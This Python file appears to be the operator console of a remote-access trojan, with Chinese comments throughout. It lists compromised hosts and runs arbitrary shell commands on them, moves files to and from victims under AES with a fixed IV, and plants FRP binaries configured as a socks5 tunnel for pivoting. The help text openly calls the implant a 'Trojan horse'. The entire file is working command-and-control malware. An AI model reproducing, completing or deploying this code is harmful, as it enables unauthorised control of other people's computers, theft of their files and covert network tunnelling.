import ssl
from time import sleep
from requests import post, packages
from base64 import b64decode, b64encode
from json import dumps, loads
from os import system, name
from os.path import basename, getsize, exists
from settings import *
from threading import Thread
from hashlib import md5
import sys
import socket, requests
from Crypto.Cipher import AES
from hashlib import sha256
from hmac import HMAC
from binascii import b2a_hex, a2b_hex
from random import randint
import os
import websockets
import asyncio
import threading
from flask import Flask, request
from flask_socketio import SocketIO, emit
from socketio import Client as SocketIOClient
from urllib.parse import urlparse

packages.urllib3.disable_warnings()


class FileCrypto:

    FIXED_IV = b'1234567890abcdef'
    BLOCK_SIZE = 16

    @staticmethod
    def pad(data):
        padding_length = FileCrypto.BLOCK_SIZE - (len(data) % FileCrypto.BLOCK_SIZE)
        padding = bytes([padding_length]) * padding_length
        return data + padding

    @staticmethod
    def unpad(data):
        padding_length = data[-1]
        if padding_length > FileCrypto.BLOCK_SIZE:
            return data
        return data[:-padding_length]

    @staticmethod
    def encrypt(data: bytes, key: str) -> bytes:
        try:
            key_bytes = key[:16].encode("utf-8")
            cipher = AES.new(key_bytes, AES.MODE_CBC, FileCrypto.FIXED_IV)
            
            # 添加填充
            padded_data = FileCrypto.pad(data)
            print(f"[DEBUG] 原始数据长度: {len(data)}, 填充后长度: {len(padded_data)}")
            
            # 加密
            encrypted_data = cipher.encrypt(padded_data)
            print(f"[DEBUG] 加密后数据长度: {len(encrypted_data)}")
            
            return encrypted_data
            
        except Exception as e:
            print(f"[ERROR] 加密错误: {e}")
            raise

    @staticmethod
    def decrypt(data: bytes, key: str) -> bytes:
        try:
            # 先进行 Base64 解码
            if isinstance(data, str):
                try:
                    data = b64decode(data)
                except Exception as e:
                    print(f"[ERROR] Base64解码失败: {e}")
                    raise
            
            print(f"[DEBUG] Base64解码后数据长度: {len(data)}")
            
            # 确保数据长度是16的倍数
            if len(data) % 16 != 0:
                print(f"[ERROR] 数据长度 {len(data)} 不是16的倍数")
                return b''
            
            key_bytes = key[:16].encode("utf-8")
            cipher = AES.new(key_bytes, AES.MODE_CBC, FileCrypto.FIXED_IV)
            
            # 解密
            decrypted_padded = cipher.decrypt(data)
            print(f"[DEBUG] 解密后数据长度: {len(decrypted_padded)}")
            
            # 移除填充
            padding_length = decrypted_padded[-1]
            if not (1 <= padding_length <= FileCrypto.BLOCK_SIZE):
                print(f"[WARN] 无效的填充长度: {padding_length}")
                return decrypted_padded
                
            # 验证填充
            padding = decrypted_padded[-padding_length:]
            if not all(x == padding_length for x in padding):
                print("[WARN] 填充验证失败")
                return decrypted_padded
                
            decrypted_data = decrypted_padded[:-padding_length]
            print(f"[DEBUG] 移除填充后数据长度: {len(decrypted_data)}")
            
            return decrypted_data
            
        except Exception as e:
            print(f"[ERROR] 解密错误: {e}")
            import traceback
            traceback.print_exc()
            return b''


class BaseFunc:
    def __init__(self, base_url=None, endpoints=None) -> None:

        self.default_endpoints = {
            "add_task": "/addtask",
            "get_result": "/getrst", 
            "get_hosts": "/getlive",
            "kill_host": "/killhost",
            "file_server": "/fileserver",
            "frp_server": "/frpserver",
            "get_keys": "/getlivekeys",
            "file_upload": "/fileupload",
            "file_down": "/filedownload"
        }

        if endpoints:
            self.default_endpoints.update(endpoints)

        if base_url:
            self.base_url = base_url
        else:
            protocol = "https"
            self.base_url = f"{protocol}://{LOCAL_IP}:{LOCAL_PORT}"

        self.send_url = self.base_url + self.default_endpoints["add_task"]
        self.get_rst = self.base_url + self.default_endpoints["get_result"]
        self.get_host = self.base_url + self.default_endpoints["get_hosts"] 
        self.del_url = self.base_url + self.default_endpoints["kill_host"]
        self.file_url = self.base_url + self.default_endpoints["file_server"]
        self.frp_url = self.base_url + self.default_endpoints["frp_server"]
        self.file_upload = self.base_url + self.default_endpoints["file_upload"]
        self.file_down = self.base_url + self.default_endpoints["file_down"]
        
        self.pwd = md5((PASSWORD + SALT_KEY).encode("utf-8")).hexdigest()
        self.host_keys = dict()

        # 初始化 SOCKS5 代理相关属性
        self.session_map = {}
        self.session_id_counter = 1000
        self.socket_proxy_thread = None
        self.sio = None  # SocketIO 客户端实例

    def sync_keys(self) -> None:
        try:
            url = self.base_url + self.default_endpoints["get_keys"]
            payload = {"pwd": self.pwd}
            rst = post(url, json=payload, timeout=5, verify=False)
            if rst.status_code == 200:
                data = loads(rst.text)
                if data.get("info") == "success":
                    self.host_keys.update(data.get("data"))
                    print("Key synchronization successful!")
                else:
                    print("Key synchronization failed:", data.get("info"))
            else:
                print("An error occurred while synchronizing the key:", rst.status_code)
        except Exception as e:
            print(f"Key synchronization exception:{e}")

    def sendcmd(self, key: str, cmd: str, time: str = ""):
        self.sync_keys()
        if isinstance(cmd, str) and isinstance(time, str):
            data = {
                "pwd": self.pwd,
                "key": key,
                "cmd": str(b64encode(dumps({"sleeptime": time, "cdm": cmd}).encode("utf-8"))).split("'")[1],
            }
            rst = post(url=self.send_url, data=data, timeout=5, verify=False)
            if rst.status_code == 200:
                rst = loads(rst.text)
                print(rst.get("info"))
            else:
                print("Connection exception!")
        else:
            print("Parameter type error!")

    def get_online_host(self):
        self.sync_keys()
        rst = post(url=self.get_host, data={"pwd": self.pwd}, timeout=5, verify=False)
        if rst.status_code == 200:
            data = loads(rst.text)
            if data.get("data").get("info"):
                print("Failed to obtain information!")
            else:
                print("\n\n                                 Current surviving host information!                                         ")
                for i, j in data.get("data").items():
                    info = j['data']
                    self.host_keys[i] = j['key']

                    print("\n| ID：{} |-| local IP：{} |-|External network IP：{} |-| user：{} |-| system information ：{} |".format(
                        i, 
                        info.get('local_ip'), 
                        info.get('remote_ip'), 
                        info.get("localuser"),
                        info.get("sys_info")
                    ))
                    print("\n")
        else:
            print("Failed to obtain information!")

    def del_host(self, host: str):
        self.sync_keys()
        if isinstance(host, str) and host != "":
            data = {"pwd": self.pwd, "key": self.host_keys.get(host)}

            r = post(url=self.del_url, data=data, timeout=5, verify=False)
            if r.status_code == 200:
                if loads(r.text).get("info") == "delete successfully":
                    print("delete successfully！")
                    sleep(1)
                    if name == "nt":
                        system("cls")
                    else:
                        pass

                else:
                    print(loads(r.text).get("info"))
            else:
                print("Server connection exception!")

    def help_info(self):
        print("""
        View current online hosts

            getlive

        Operate the online host

            Set host ID operation [shell, time, uploadfile, downlile, del, frp, sockets] parameters

            example：
              set ID shell The system command you want to execute
              set ID time The time you want to set (if the time is less than zero, it defaults to 10)
              set ID uploadfile The file path to be uploaded is the target path
              set ID downfile Target file path
              set ID del(Delete Host)
              set ID shell exit_yes(Executing this command will cause the Trojan horse to stop running)
              set ID frp windows/linux:x64/x86(Specify the use of FRP program architecture) Port 
              set ID sockets service local_port

        view help
            help

        To exit, please press twice ctrl + c

        """)

    def uploadfile(self, host_key: str, filepath: str, targetfilepath: str):
        self.sync_keys()
        if not exists(filepath.strip()):  # 判断要上传的文件是否存在
            print("文件不存在！")
            return -1
        if targetfilepath.strip()[-1] != "/":  # 判断目标路径是否符合 /目录/ 格式
            targetfilepath += "/"
            

        # 加密文件准备
        encrypted_filepath = filepath + ".enc"
        try:
            with open(filepath, "rb") as original_file:
                original_data = original_file.read()
            encrypted_data = FileCrypto.encrypt(original_data, host_key)  # 使用对应的密钥进行加密
            with open(encrypted_filepath, "wb") as encrypted_file:
                encrypted_file.write(encrypted_data)
            print(f"文件加密完成，保存路径：{encrypted_filepath}")
        except Exception as e:
            print(f"文件加密失败：{e}")
            return -1
        
        filename = basename(encrypted_filepath)  # 获取加密文件的名称
        filesize = getsize(encrypted_filepath)  # 获取加密文件的大小

        #asyncio.get_event_loop().run_until_complete(self.upload_large_file(uri, encrypted_filepath))
        with open(encrypted_filepath, "rb") as f:
            data = {"pwd": self.pwd, 'hostkey': host_key, 'targetpath': targetfilepath}
            files = {'file': (basename(encrypted_filepath), f)}  # 注意这里传递的是二元组
            response = requests.post(url=self.file_upload, files=files, data=data, verify=False)
            print(response)
            self.sendcmd(host_key, "upload_file")

        try:
            from os import remove
            remove(encrypted_filepath)
            print(f"临时加密文件已删除：{encrypted_filepath}")
        except Exception as e:
            print(f"删除加密文件失败：{e}")

        return 0

    def downfile(self, host_key: str, filepath: str, aes_key: str):
        print(f"[DEBUG] 发起文件下载 - host_key: {host_key}")
        print(f"[DEBUG] 文件路径: {filepath}")
        
        # 构造下载命令
        cmd_data = {
            'cdm': 'send_file',
            'file_path': filepath
        }
        print(f"[DEBUG] 命令数据: {cmd_data}")

        file_name = os.path.basename(filepath)  # 获取文件名（不包括路径）    
        
        # 编码命令
        encoded_cmd = b64encode(dumps(cmd_data).encode("utf-8")).decode()
        print(f"[DEBUG] 编码后的命令: {encoded_cmd}")
        
        # 发送到服务器
        data = {
            "pwd": self.pwd,
            "key": host_key,
            "cmd": encoded_cmd
        }
        
        response = post(url=self.send_url, data=data, timeout=5, verify=False)
        print(f"[DEBUG] 服务器响应: {response.status_code}")
        
        if response.status_code == 200:
            print("[DEBUG] 下载请求发送成功")
            data = {
                "pwd": self.pwd,
                "hostkey": host_key,
            }
            sleep(15)
            
            # 发送请求到服务器的 /filedownload 接口
            response = post(url = self.file_down, data=data, timeout=5, verify=False)
            print("文件成功下载")
            if response.status_code == 200:
                file_path = "./downfile/" + file_name + "en"
                # 确保下载目录存在
                os.makedirs(os.path.dirname(file_path), exist_ok=True)
                # 将文件保存到指定路径
                with open(file_path, 'wb') as f:
                    f.write(response.content)
                
                print(f"File saved to {file_path}")
            else:
                print(f"Error: {response.status_code} - {response.text}")
            # 解密文件
            try:
                print("正在解密文件...")
                with open(file_path, "rb") as enc_fp:
                    encrypted_data = enc_fp.read()
                decrypted_data = FileCrypto.decrypt(encrypted_data, host_key)  # 使用密钥解密数据
                decrypted_filepath = "./downfile/" + file_name # 解密后的文件路径
                with open(decrypted_filepath, "wb") as dec_fp:
                    dec_fp.write(decrypted_data)
                print(f"文件解密完成，保存路径：{decrypted_filepath}")
                # 删除加密文件
                from os import remove
                remove(file_path)
                print(f"临时加密文件已删除：{file_path}")
            except Exception as e:
                print(f"文件解密时发生错误：{e}")

    def frp_built(self, host_key: str, plat: str, port: str):

        self.sync_keys()

        plat = plat.strip().lower()
        if plat == "linux:x64":
            filepath = "./software/frp/frpc_x64"
        elif plat == "linux:x86":
            filepath = "./software/frp/frpc_x86"
        elif plat == "windows:x64":
            filepath = "./software/frp/frpc_x64.exe"
        elif plat == "windows:x86":
            filepath = "./software/frp/frpc_x86.exe"
        else:
            print("This operating system platform is currently not supported!!!")
            return -1

        if port == "60000" or port == str(LOCAL_PORT):
            print("This port is already occupied!!!")
            return -1
        print("Uploading FRP program files to the target machine...")
        with open("./software/frp/frpc.ini", "w", encoding="utf-8") as fp:

            contents = "[common]\ntls_enable = true\nserver_addr = " + LOCAL_IP + "\nserver_port = " + str(
                int(port.strip()) + 1) + "\n\n" \
                       + "[ssh]\ntype = tcp\nremote_port = " + port.strip() + "\nplugin = socks5"
            fp.write(contents)
        f = 0
        f = self.uploadfile(host_key, filepath, "./")
        if f == -1:
            print("Program file upload failed!")
            return -1
        sleep(2)
        f = self.uploadfile(host_key, "./software/frp/frpc.ini", "./")
        if f == -1:
            print("Configuration file upload failed!")
            return -1
        else:

            print("Opening server port...")
            r = post(url=self.frp_url, data={"pwd": self.pwd, "port": port}, timeout=5, verify=False).status_code
            if r == 404:
                print("FRP Server startup successful!")
            else:
                print("FRP server startup failed!")
                return -1
            print("Distribute tasks!")
            if plat.split(":")[0] == "linux":
                self.sendcmd(host_key, "chmod +x ./" + basename(filepath) + "&&nohup ./" + basename(
                    filepath) + " -c ./frpc.ini &")
            else:
                self.sendcmd(host_key, ".\\" + basename(filepath) + " -c .\\frpc.ini")
        pass

    def opt_deal(self, opt: str):
        self.sync_keys()
        opt_ = opt.strip().split(' ')
        if opt_[0].strip() == "set":
            if opt_[2].strip() == "shell":
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    self.sendcmd(self.host_keys.get(opt_[1].strip()), opt.split("shell")[1].strip())
                else:
                    print("主机不存在!")
            elif opt_[2].strip() == "time":
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    self.sendcmd(self.host_keys.get(opt_[1].strip()), cmd="set time", time=opt.split("time")[1].strip())
                else:
                    print("主机不存在!")
            elif opt_[2].strip() == "del":
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    self.del_host(opt_[1].strip())
                else:
                    print("主机不存在!")
            elif opt_[2].strip() == "uploadfile":
                file = opt.split("uploadfile")[1].split(" ")
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    try:
                        if file[1].strip() and file[2].strip():
                            self.uploadfile(self.host_keys.get(opt_[1].strip()), file[1].strip(), file[2].strip())
                        else:
                            print("参数错误!")
                    except IndexError:
                        print("参数错误!")
            elif opt_[2].strip() == "sockets":
                # 处理 sockets 命令，启动 SOCKS5 代理
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    try:
                        service = opt_[3].strip()
                        local_port = opt_[4].strip()
                        print(f"[DEBUG] 设置sockets代理 - service: {service}, local_port: {local_port}")
                        SOCKET_PORT = int(local_port)
                        SOCKET_URL = opt_[3].strip()
                        # 启动 SOCKS5 代理
                        self.start_socket_proxy(service, SOCKET_URL, SOCKET_PORT, self.host_keys.get(opt_[1].strip()))
                    except IndexError:
                        print("参数错误!")
                else:
                    print("主机不存在!")
            elif opt_[2].strip() == "downfile":
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    try:
                        if opt_[3].strip():
                            self.downfile(self.host_keys.get(opt_[1].strip()), opt_[3].strip(), self.host_keys.get(opt_[1].strip()))
                        else:
                            print("参数错误!")
                    except IndexError:
                        print("参数错误!")
                else:
                    print("主机不存在!")
            elif opt_[2].strip() == "frp":
                if {opt_[1].strip()} & {i for i in self.host_keys.keys()} == {opt_[1].strip()}:
                    try:
                        if opt_[1].strip() and opt_[3].strip() and opt_[4].strip():
                            self.frp_built(self.host_keys.get(opt_[1].strip()), opt_[3].strip(), opt_[4].strip())
                        else:
                            print("Parameter error!")
                    except:
                        print("Parameter error!")
            else:
                print("Operation not supported!")
        elif opt_[0].strip() == "getlive":
            if name == "nt":
                system("cls")
            else:
                system("clear")
            self.get_online_host()

        elif opt_[0].strip() == "help":
            self.help_info()

        else:
            print("Operation not supported!")

    def start_socket_proxy(self, service: str, server_url: str, local_port: int, host_key: str):
        if self.socket_proxy_thread and self.socket_proxy_thread.is_alive():
            print("SOCKS5 代理已经在运行中！")
            return

        def proxy_main():
            # 初始化 SocketIO 客户端
            self.sio = SocketIOClient(ssl_verify=False)
            
            @self.sio.event
            def connect():
                print("[SOCKS5 Proxy] Connected to server")

            @self.sio.event
            def connect_error(data):
                print("[SOCKS5 Proxy] Failed to connect to server:", data)

            @self.sio.event
            def disconnect():
                print("[SOCKS5 Proxy] Disconnected from server")

            @self.sio.on('response_from_server')
            def on_server_response(data):
                # 从 server 返回的数据，包含 session_id 和实际 payload
                session_id = data.get('session_id')
                payload = data.get('payload')
                print(payload)
                # 根据 session_id 找到对应的本地连接，将数据写回
                for conn, sid in self.session_map.items():
                    if sid == session_id:
                        try:
                            if isinstance(payload, str):
                                payload = payload.encode('utf-8')  # 将字符串转换为字节串
                            else:
                                payload = payload  # 如果 payload 已经是字节串，直接使用
                            payload = b64encode(payload)
                            print(payload, conn)
                            conn.sendall(payload)
                        except Exception as e:
                            print(f"[SOCKS5 Proxy] Error sending data to local client: {e}")

            # 连接到服务器的 SocketIO
            self.sio.connect(f'https://{LOCAL_IP}:{LOCAL_PORT}')
            
            # 启动本地 SOCKS5 代理服务器
            self.start_local_socket_server(server_url, local_port, host_key)

            self.sio.wait()

        self.socket_proxy_thread = Thread(target=proxy_main, daemon=True)
        self.socket_proxy_thread.start()
        print(f"SOCKS5 代理已启动，监听本地端口 {local_port}")

    def split_server_url(self, server_url):
        # 确保加上 http:// 前缀，以便 urlparse 可以正确解析
        if not server_url.startswith('http'):
            server_url = 'http://' + server_url
        
        parsed_url = urlparse(server_url)
        
        # 返回主机和端口
        return parsed_url.hostname, parsed_url.port

    def start_local_socket_server(self, server_url:str, local_port: int, host_key: str):
        def handle_local_connection(conn, addr):
            self.session_id_counter += 1
            this_session_id = self.session_id_counter
            self.session_map[conn] = this_session_id
            
            host, port = self.split_server_url(server_url)

            # 通知 server 建立对应的 session
            self.sio.emit('start_session', {
                'session_id': this_session_id,
                'target_host': host,
                'target_port': port
            })

            print(f"[SOCKS5 Proxy] Local connection established with session_id: {this_session_id}")

            try:
                while True:
                    data = conn.recv(4096)
                    if not data:
                        break
                    # 将数据通过 WS 转发给 server
                    self.sio.emit('data_from_client', {
                        'session_id': this_session_id,
                        'payload': b64encode(data).decode()  # 确保数据为可序列化的格式
                    })
            except Exception as e:
                print(f"[SOCKS5 Proxy] Local connection error: {e}")
            finally:
                # 关闭会话
                self.sio.emit('end_session', {'session_id': this_session_id})
                conn.close()
                del self.session_map[conn]

        def local_server():
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind(('0.0.0.0', local_port))
            s.listen(5)
            print(f"[SOCKS5 Proxy] Local SOCKS5-like proxy listening on port {local_port}")
            while True:
                conn, addr = s.accept()
                threading.Thread(target=handle_local_connection, args=(conn, addr), daemon=True).start()

        threading.Thread(target=local_server, daemon=True).start()

def getrst(basefun):
    print("[DEBUG] 启动结果监听")
    while True:
        try:
            data = post(url=basefun.get_rst, data={"pwd":basefun.pwd}, timeout=5, verify=False)
            if data.status_code == 200:
                data = loads(data.text)
                if data:
                    print("\n[DEBUG] 收到新的结果数据")
                    print(f"[DEBUG] 结果数据: {data}")
                    
                    for key, i in data.items():
                        if isinstance(i, dict):
                            rst = i.get('data')
                            print(f"[DEBUG] 处理结果数据: {rst}")
                            
                            if rst and rst.get('cdm') == 'download_file':
                                try:
                                    print("[DEBUG] 检测到文件下载数据")
                                    file_data = rst.get('file_data')
                                    if file_data:
                                        print(f"[DEBUG] 接收到文件数据，大小: {len(file_data)}")
                                        
                                        # 确保下载目录存在
                                        from os import makedirs
                                        makedirs("./downfile", exist_ok=True)
                                        
                                        # 解密文件数据
                                        host_key = key
                                        aes_key = basefun.host_keys.get(host_key)
                                        if not aes_key:
                                            print(f"[ERROR] 未找到AES密钥: {host_key}")
                                            continue
                                            
                                        print(f"[DEBUG] 使用密钥解密: {aes_key}")
                                        encrypted_data = b64decode(file_data)
                                        decrypted_data = FileCrypto.decrypt(encrypted_data, aes_key)
                                        
                                        # 保存文件
                                        filename = rst.get('original_filename', f"downloaded_{int(time.time())}.txt")
                                        filepath = f"./downfile/{filename}"
                                        
                                        with open(filepath, "wb") as f:
                                            f.write(decrypted_data)
                                        print(f"\n[+] 文件下载完成！保存为: {filepath}")
                                        
                                        # 显示文件内容预览
                                        try:
                                            with open(filepath, "r", encoding='utf-8') as f:
                                                content = f.read(100)

                                        except UnicodeDecodeError:
                                            print("[INFO] 文件可能是二进制格式")
                                    else:
                                        print("[ERROR] 没有收到文件数据")
                                except Exception as e:
                                    print(f"[ERROR] 文件下载处理错误: {e}")
                                    import traceback
                                    traceback.print_exc()
                            else:
                                if rst and rst.get('cdm'):
                                    print(f"\n[+] 命令 {rst.get('cdm')} 执行结果:\n{rst.get('data')}")
                        elif isinstance(i, str):
                            print(f"\n[INFO] {i}")
            sleep(2)
        except Exception as e:
            print(f"[ERROR] 结果处理错误: {e}")
            sleep(2)
            continue